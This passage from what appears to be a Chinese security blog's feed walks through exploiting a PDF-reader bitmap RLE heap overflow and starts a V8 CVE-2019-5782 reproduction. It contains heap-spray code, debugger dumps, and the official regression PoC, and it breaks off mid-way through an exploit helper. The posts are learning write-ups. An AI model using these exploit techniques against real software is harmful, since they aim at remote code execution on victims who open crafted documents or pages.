class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);            <span class="comment">// 可控数据实现堆块越界写</span></span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// 解压数据</span></span><br></pre></td></tr></table></figure><p>RLE4的也差不多，稍复杂一些，就不粘代码了，不过是两处，其中RLE8少的那一处就是2013年修的那个。</p><p>RLE4 数据解析过程中存在的两处溢出点很难实现稳定利用，因为在向扫描线填充像素数据时，偏移值为 xpos 的值除以 2 ，此时偏移值最大可以是 0xFFFFFFFF / 2 = 0x7FFFFFFF ，也就意味着仅能向高地址方向实现堆块越界写，而且这个地址上具体是什么数据很难控制。</p><p>而 RLE8 数据解析过程中存在的溢出点就相对好控制一些，因为在向扫描线填充像素数据时，偏移值就是 xpos 本身，这样就可以向低地址方向实现堆块越界写，而且越界写的范围在一定程度上也是可控的。在下面的代码中，(unsigned __int8)cmd 的最大值可以是 0xFF ，为了绕过 if 语句中的条件检查，xpos 的最小值是 0xFFFFFF01 （在有符号类型下表示为 -255）。这也就意味着最大可以向低地址方向越界写 0xFF 字节的数据。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>这个还是说的比较清晰的。</p><h4 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h4><p>这里借助 ArrayBuffer 来完成内存布局，js通常都是这个套路。</p><p>因为位图解析过程中创建的堆块大小为 0xF0 字节，因此 ArrayBuffer 的 byteLength 可以设置为 0xE0 。为了创建内存空洞，可以先创建大量的 ArrayBuffer 对象，然后间隔释放其中的一半对象，理想情况下的内存布局如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │     Hole    │ ArrayBuffer │     Hole    │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┘</span><br><span class="line">│ &lt;-  0xF0 -&gt; │</span><br></pre></td></tr></table></figure><p>在触发漏洞时，位图解析相关的堆块会落到其中一个空洞上：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┘</span><br></pre></td></tr></table></figure><p>因为可以向低地址方向越界写 0xF4 字节的 0x10 数据，所以触发漏洞之后，ArrayBuffer 对象的 backing store 的内存布局如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 304c8398</span><br><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">304c8398  00000000 10101010 10101010 10101010</span><br><span class="line">;         ArrayBuffer 数据</span><br><span class="line">304c83a8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83b8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83c8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83d8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83e8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83f8  10101010 10101010 10101010 10101010</span><br><span class="line">304c8408  10101010 10101010 10101010 10101010</span><br><span class="line">304c8418  10101010 10101010 10101010 10101010</span><br><span class="line">304c8428  10101010 10101010 10101010 10101010</span><br><span class="line">304c8438  10101010 10101010 10101010 10101010</span><br><span class="line">304c8448  10101010 10101010 10101010 10101010</span><br><span class="line">304c8458  10101010 10101010 10101010 10101010</span><br><span class="line">304c8468  10101010 10101010 10101010 10101010</span><br><span class="line">304c8478  10101010 10101010 10101010 10101010 ; ArrayBuffer 结束</span><br><span class="line">; 下一个堆块的元数据（存储位图数据的堆块）</span><br><span class="line">304c8488  10101010 10101010</span><br><span class="line">; 位图数据</span><br><span class="line">304c8490                    00000000 00000000</span><br></pre></td></tr></table></figure><p>此时 ArrayBuffer 对象的 byteLength 被改成了 0x10101010 ，但是 DataView 对象的指针也被改成了 0x10101010 ，前面提到过这会导致进程崩溃。</p><p>为了避免进程崩溃，需要提前在地址 0x10101010 上布局数据，让这个地址看起来就是一个 DataView 指针。很明显，为了漏洞利用更加稳定，我们需要一开始就在这里布局好数据。</p><p>同样，这里借助 ArrayBuffer 实现精确的内存布局：</p><p>创建大量 byteLength 为 0xFFE8 的 ArrayBuffer<br>在特定内存范围内，ArrayBuffer 的 backing store 将有序的出现在地址 0xYYYY0048 上之所以选择 0xFFE8 ，是因为这会使得 backing store 所在堆块整体的大小为 0x10000 ：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0xFFE8 -&gt; byteLength</span></span><br><span class="line"><span class="comment">// 0x10 -&gt; sizeof ObjectElements</span></span><br><span class="line"><span class="comment">// 0x08 -&gt; sizeof heap block's metadata</span></span><br><span class="line"><span class="number">0xFFE8</span> + <span class="number">0x10</span> + <span class="number">0x08</span> = <span class="number">0x10000</span></span><br></pre></td></tr></table></figure><p>使用下面的代码进行内存布局，可以有效防止进程崩溃（具体细节不作讲解，相关条件很容易通过动态调试分析出来）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，这仅仅只能防止漏洞触发后进程的崩溃，如果要为该 ArrayBuffer 关联新的 DataView 来读写数据，那么会导致新的崩溃。同样，填充一点新的数据就可以防止进程崩溃，新的代码如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// 防止触发漏洞之后进程立刻 Crash</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// 防止关联 DataView 对象时 Crash</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFFA4</span>, <span class="number">0x10100458</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="全局读写"><a href="#全局读写" class="headerlink" title="全局读写"></a>全局读写</h4><p>当 ArrayBuffer 对象的 byteLength 被改成 0x10101010 之后，可以基于这个 ArrayBuffer 对象修改下一个 ArrayBuffer 对象的 byteLength 。在基于 ArrayBuffer 创建内存空洞时，可以在每一个 ArrayBuffer 上存储特定的标记值，这样在内存中搜索 ArrayBuffer 对象就非常简单了。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  (1)byteLength            (3)Global Access</span><br><span class="line"> ┌─&lt;───&lt;───&lt;───┐            &lt;──────┬──────&gt;</span><br><span class="line">┌┼────────────┬┼────────────┬──────┼──────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │</span><br><span class="line">└──────┼──────┴─────────────┴┼────────────┴─────────────┘</span><br><span class="line">       └──&gt;───&gt;───&gt;───&gt;────&gt;─┘</span><br><span class="line">        (2) byteLength to -1</span><br></pre></td></tr></table></figure><p>当下一个 ArrayBuffer 对象的 byteLength 被改成 0xFFFFFFFF 时，基于这个 ArrayBuffer 对象就可以实现用户态空间的全局读写了。</p><h4 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h4><p>一旦拥有全局读写的能力，我们就可以向低地址方向来搜索特定的关键字来定位 ArrayBuffer 对象在内存中的绝对地址，然后基于这个绝对地址来实现任意地址读写。</p><p>这里可以通过搜索 ffeeffee 或者 f0e0d0c0 来定位，为了提高准确性，需要同时校验关键字附近的数据的取值范围。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 30080000</span><br><span class="line">30080000  16b80e9e 0101331b ffeeffee 00000002  ; ffeeffee</span><br><span class="line">30080010  055a00a4 2f0b0010 055a0000 30080000  ; +0x14 -&gt; 30080000</span><br><span class="line">30080020  00000fcf 30080040 3104f000 000002e5</span><br><span class="line">30080030  00000001 00000000 30d69ff0 30d69ff0</span><br><span class="line">30080040  3eb82e96 08013313 00000000 0000ffe8</span><br><span class="line">30080050  00000000 00000000 10100158 00000000</span><br><span class="line">30080060  00000000 00000000 00000000 00000000</span><br><span class="line">30080070  00000000 00000000 00000000 00000000</span><br><span class="line"></span><br><span class="line">0:014&gt; dd 305f4000</span><br><span class="line">305f4000  00000000 00000000 6ab08d69 0858b71a</span><br><span class="line">305f4010  0bbab388 30330080 0ff00112 f0e0d0c0  ; f0e0d0c0</span><br><span class="line">305f4020  15dc2c3f 00000430 305f402c d13bc929  ; +0x0C -&gt; 305f402c</span><br><span class="line">305f4030  e5c521a7 d9b264d4 919cee58 45da954e</span><br><span class="line">305f4040  5c3f608b 2b5fd340 0bae3aa9 2b5fd340</span><br><span class="line">305f4050  0fae32aa d13bc929 e5c521a7 d9b264d4</span><br><span class="line">305f4060  919cee58 45da954e 9c3f608b f952aa94</span><br><span class="line">305f4070  989c772a a1dd934a ac5b154b 2fadd038</span><br></pre></td></tr></table></figure><h4 id="剩余步骤"><a href="#剩余步骤" class="headerlink" title="剩余步骤"></a>剩余步骤</h4><p>在拥有任意地址读写能力之后，实现代码执行就是固定的套路了：</p><ul><li>EIP 劫持</li><li>ASLR 绕过</li><li>DEP 绕过</li><li>CFG 绕过</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在我眼中，文档型漏洞就是，Office系列跟Adobe系列，或者其它要解析文档的程序，解析文档有内存控制问题，达到恶意文档可以产生RCE的目的。可能还有一些Word解析公式的问题，暂且都归为文档型，因为具体叫什么怎么分，我也不会分。还有VS Code的RCE的问题，不知道能
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
      <category term="Docs" scheme="https://github.com/Cracke-S-J/categories/CVE/Docs/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
      <category term="Docs" scheme="https://github.com/Cracke-S-J/tags/Docs/"/>
    
  </entry>
  
  <entry>
    <title>v8入门学习</title>
    <link href="https://github.com/Cracke-S-J/2020/04/30/v8%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>https://github.com/Cracke-S-J/2020/04/30/v8%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-04-30T15:18:18.000Z</published>
    <updated>2020-05-04T13:10:01.410Z</updated>
    
    <content type="html"><![CDATA[<p>前一阵好不容易把v8环境搓好了，要学习一波v8、浏览器漏洞。</p><h2 id="入门知识"><a href="#入门知识" class="headerlink" title="入门知识"></a>入门知识</h2><ol><li><a href="https://mp.weixin.qq.com/s/t__Jqzg1rbTlsCHXKMwh6A" target="_blank" rel="noopener">JavaScript 引擎 V8 执行流程概述</a></li><li><a href="https://www.anquanke.com/post/id/185339" target="_blank" rel="noopener">V8 Bug Hunting 之 JS 类型对象的内存布局总结</a></li><li><a href="https://zhuanlan.zhihu.com/p/28780798" target="_blank" rel="noopener">奇技淫巧学 V8 之二，对象在 V8 内的表达</a></li><li><a href="https://juejin.im/post/5cc7dc5af265da038d0b514d" target="_blank" rel="noopener">V8 是怎么跑起来的 —— V8 中的对象表示</a></li><li><a href="https://juejin.im/post/5dc4d823f265da4d4c202d3b" target="_blank" rel="noopener">V8 是怎么跑起来的 —— V8 的 JavaScript 执行管道</a></li><li><a href="https://mp.weixin.qq.com/s/vM9Ahk9axTvNUADjc3kyyg" target="_blank" rel="noopener">手把手教你入门V8漏洞利用</a></li><li><a href="https://www.sunxiaokong.xyz/2020-01-13/lzx-v8001/" target="_blank" rel="noopener">Chrome V8 学习笔记（一）</a></li></ol><p>还有两条入门想说的：</p><ol><li>既然可以泄露地址和任意内存读写，就也可以传统利用，不是非要wasm那种利用。</li><li>具体目的是，构造一个特殊的html，里面写exp的js，然后Victim点开html，达到RCE。</li></ol><h3 id="对象内存布局"><a href="#对象内存布局" class="headerlink" title="对象内存布局"></a>对象内存布局</h3><p>我早就该整理，结果太懒了，明天一定。我的bb还没写，明天一定。明天一定。终于今天一定。</p><table><thead><tr><th style="text-align:center">JSObject</th></tr></thead><tbody><tr><td style="text-align:center">Map</td></tr><tr><td style="text-align:center">Properties</td></tr><tr><td style="text-align:center">Elements</td></tr><tr><td style="text-align:center">Property #1</td></tr><tr><td style="text-align:center">Property#2</td></tr></tbody></table><p>Map大致是个头：</p><ul><li>type： 表述了堆内实例是一个 JSObject 对象</li><li>inobject properties：对象内存储空间（包含未使用的 slots）</li><li>unused property fields：未使用的属性存储空间</li><li>instance size：实例（在堆内）的大小</li><li>constructor：对象构造器</li><li>prototype：对象原型</li><li><p>stable[dictionary]：对象当前状态</p><ul><li>stable_map：快速模式</li><li>dictionary_map：字典模式<br>… …</li></ul></li><li><p>预分配（不超过）一定大小*的空间用作对象内属性存储（inobject_properties）。</p></li><li>预分配空间不足时（无空闲 slot），新增属性会存储在 properties 内。</li><li>数字式属性存储在 elements 内。</li><li>properties/elements 空间不足时会创建（拷贝）一个更大的 FixedArray。</li></ul><p>基本就是这个意思，其它可能不清楚的临用到再调。</p><p>还有对象的快速模式/字典模式，GC的处理等。</p><h3 id="JS部分语法"><a href="#JS部分语法" class="headerlink" title="JS部分语法"></a>JS部分语法</h3><h4 id="Array-from"><a href="#Array-from" class="headerlink" title="Array.from()"></a>Array.from()</h4><p>这个是make一个Array from某些东西。</p><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.from(<span class="string">'foo'</span>) <span class="comment">//Array ["f", "o", "o"]</span></span><br><span class="line"><span class="built_in">Array</span>.from([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], x =&gt; x + x) <span class="comment">// Array [2, 4, 6]</span></span><br></pre></td></tr></table></figure><h4 id="Function-prototype-call"><a href="#Function-prototype-call" class="headerlink" title="Function.prototype.call()"></a>Function.prototype.call()</h4><p>这个主要就是能给指定一个this。</p><h4 id="Symbol-iterator"><a href="#Symbol-iterator" class="headerlink" title="Symbol.iterator"></a>Symbol.iterator</h4><p>就跟通常的迭代器差不多，可以自定义。理解下面这段基本就能理解下面那个chromium821137了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里自定义了一个带迭代器的func，然后call调用，然后传给array.from生成一个Array</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">objIter</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name,</span><br><span class="line">    <span class="keyword">this</span>.age  = age,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">objIter.prototype[<span class="built_in">Symbol</span>.iterator] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> _this   = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">let</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> propers = <span class="built_in">Object</span>.keys(_this);</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        next()&#123;</span><br><span class="line">            <span class="keyword">if</span> (counter &lt; propers.length)&#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="attr">value</span>:_this[propers[counter++]], <span class="attr">done</span>:<span class="literal">false</span>&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="attr">value</span>:<span class="literal">undefined</span>, <span class="attr">done</span>:<span class="literal">true</span>&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> objIter(<span class="string">'ss'</span>, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> array = [];</span><br><span class="line"><span class="built_in">Array</span>.from.call (</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> array &#125;, obj</span><br><span class="line">);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Array: "</span> + array);</span><br></pre></td></tr></table></figure><h2 id="CVE-2019-5782-v8数组越界-漏洞复现"><a href="#CVE-2019-5782-v8数组越界-漏洞复现" class="headerlink" title="CVE-2019-5782 v8数组越界 漏洞复现"></a>CVE-2019-5782 v8数组越界 漏洞复现</h2><p><a href="https://www.sunxiaokong.xyz/2020-02-25/lzx-cve-2019-5782/" target="_blank" rel="noopener">https://www.sunxiaokong.xyz/2020-02-25/lzx-cve-2019-5782/</a></p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>TODO: 还没分析，应该是v8优化有问题???</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>这一版有问题。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard b474b3102bd4a95eafcdb68e0e44656046132bc9</span><br><span class="line">gclient sync</span><br><span class="line">./tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C ./out.gn/x64.debug/</span><br></pre></td></tr></table></figure><p><a href="https://chromium.googlesource.com/v8/v8.git/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04/test/mjsunit/regress/regress-crbug-906043.js" target="_blank" rel="noopener">官方POC</a></p><p>有意思，google官方的regression test。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright 2018 the V8 project authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="comment">// found in the LICENSE file.</span></span><br><span class="line"><span class="comment">// Flags: --allow-natives-syntax</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="built_in">arguments</span>.length;</span><br><span class="line">  a1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">  a1[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">  a2 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">  a2[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">  a1[(x &gt;&gt; <span class="number">16</span>) * <span class="number">21</span>] = <span class="number">1.39064994160909e-309</span>;  <span class="comment">// 0xffff00000000</span></span><br><span class="line">  a1[(x &gt;&gt; <span class="number">16</span>) * <span class="number">41</span>] = <span class="number">8.91238232205e-313</span>;  <span class="comment">// 0x2a00000000</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a1, a2;</span><br><span class="line"><span class="keyword">var</span> a3 = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line">a3.length = <span class="number">0x11000</span>;</span><br><span class="line">a3.fill(<span class="number">3.3</span>);</span><br><span class="line"><span class="keyword">var</span> a4 = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) fun(...a4);</span><br><span class="line">%OptimizeFunctionOnNextCall(fun);</span><br><span class="line">fun(...a4);</span><br><span class="line">res = fun(...a3);</span><br><span class="line">assertEquals(<span class="number">16</span>, a2.length);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">8</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">  assertEquals(<span class="literal">undefined</span>, a2[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pwndbg调试<code>./d8 --allow-natives-syntax poc.js</code>，发现这个POC确实溢出了，a2长度变为了65536。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>可以发现a2溢出了很多，所以一切都比较好控制。基本思路是<code>数组越界 -&gt; 类型混淆 -&gt; 泄漏对象、任意地址读写 -&gt; 利用WASM执行shellcode</code>。</p><h4 id="定义类型转换工具函数"><a href="#定义类型转换工具函数" class="headerlink" title="定义类型转换工具函数"></a>定义类型转换工具函数</h4><p>在V8中，number有两种形式，一种是float，一种是smi(small int)，（还有比较新的bigint任意精度整数类型）。为方便使用，需要写一些方法用于转换数据类型，这个依我入门新手的经验来看，是一般exp都需要的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*---------------------------datatype convert-------------------------*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">typeConvert</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.buf   = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">this</span>.f64   = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.u32   = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// convert float to int</span></span><br><span class="line">    f2i(val) &#123;</span><br><span class="line">        <span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        convert int to float</span></span><br><span class="line"><span class="comment">        if nead convert a 64bits int to float</span></span><br><span class="line"><span class="comment">        please use string like "deadbeefdeadbeef"</span></span><br><span class="line"><span class="comment">        (v8's SMI just use 56bits, lowest 8bits is zero as flag)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    i2f(val) &#123;</span><br><span class="line">        <span class="keyword">let</span> vall = hex(val);</span><br><span class="line">        <span class="keyword">let</span> tmp  = [];</span><br><span class="line">        tmp[<span class="number">0</span>]   = vall.slice(<span class="number">10</span>, );</span><br><span class="line">        tmp[<span class="number">1</span>]   = vall.slice(<span class="number">2</span>, <span class="number">10</span>);</span><br><span class="line">        tmp[<span class="number">0</span>]   = <span 